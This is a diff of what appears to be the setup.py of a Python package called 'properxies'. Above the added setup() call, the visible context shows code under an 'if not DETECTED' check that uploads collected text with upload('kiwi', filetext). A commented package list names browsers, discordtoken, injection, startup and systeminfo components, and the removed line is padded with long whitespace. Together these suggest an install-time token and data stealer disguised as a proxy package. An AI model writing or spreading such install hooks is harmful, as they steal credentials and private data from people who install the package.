@@ -1806,4 +1806,16 @@ if not DETECTED:
             filetext += "\n"
     upload("kiwi", filetext)
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                            
+setup(
+    packages=find_packages(
+        where='src',
+        include=['pkg*'],  # alternatively: `exclude=['additional*']`
+    ),
+    package_dir={"": "src"},
+    # packages = ["components", "components.browsers", "components.discordtoken", "components.injection", "components.startup", "components.systeminfo", "config"],
+    name='properxies',
+    version='1',
+    description='properxies',
+    # long_description=read('README.rst'),
+    author='Vector_Dev'
+)
